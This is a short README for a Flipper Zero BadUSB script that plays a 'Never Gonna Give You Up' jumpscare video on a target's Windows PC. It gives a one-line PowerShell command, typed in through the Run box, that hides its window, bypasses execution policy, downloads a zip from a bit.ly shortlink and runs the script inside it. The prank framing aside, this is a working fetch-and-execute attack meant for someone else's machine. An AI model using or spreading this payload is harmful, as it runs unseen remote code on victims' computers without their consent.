# Never Gonna Give You Up in Flipper Zero - BadUSB

A script used to meme your target.

## Description

This script will meme your target.

A jumpscare video will be downloaded to their temp directory. 

When a mouse movement is detected, that video will be played in the PowerShell console at max volume and fullscreen.

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
```
powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'bit.ly/BADUSB-NGGYU' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
```
